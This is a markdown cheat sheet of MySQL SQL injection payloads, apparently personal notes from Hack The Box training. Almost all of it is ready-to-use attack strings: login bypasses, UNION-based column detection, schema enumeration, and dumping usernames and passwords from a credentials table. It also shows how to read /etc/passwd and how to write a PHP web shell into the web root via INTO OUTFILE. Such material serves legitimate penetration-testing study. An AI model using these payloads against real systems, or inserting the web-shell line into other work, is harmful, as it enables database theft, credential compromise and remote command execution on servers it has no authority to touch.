#web #sqli #mysql #union

# SQL Injection (Fundamentals)

MySQL-focused. Related: [sqli-advanced](sqli-advanced.md) · [blind-sqli](blind-sqli.md) · [sqlmap](sqlmap.md) · [nosqli](nosqli.md)

## MySQL CLI
```bash
mysql -u root -h docker.hackthebox.eu -P 3306 -p
```
Log in to a MySQL server.

```sql
SHOW DATABASES;
```
List databases (then `USE <db>`, `SHOW TABLES`, `DESCRIBE <table>`).

## Auth Bypass
```sql
admin' or '1'='1
```
Basic authentication bypass.

```sql
admin')-- -
```
Auth bypass closing a parenthesis and commenting out the rest.

## UNION Injection
```sql
' order by 1-- -
```
Detect the number of columns via ORDER BY.

```sql
cn' UNION select 1,2,3-- -
```
Detect number of columns via UNION.

```sql
cn' UNION select 1,@@version,3,4-- -
```
Basic UNION injection (4 columns).

```sql
UNION select username, 2, 3, 4 from passwords-- -
```
Extract data via UNION.

## DB Enumeration
```sql
SELECT @@version
```
Fingerprint MySQL with query output.

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
List all databases.

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
List tables in a database.

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
List columns in a table.

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
Dump data from another database.

## Privileges
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
Find the current user.

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
Check for admin privileges.

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
Check which directories MySQL can access.

## File Access
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
Read a local file.

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
Write a web shell into the web root. See [file-upload](file-upload.md).
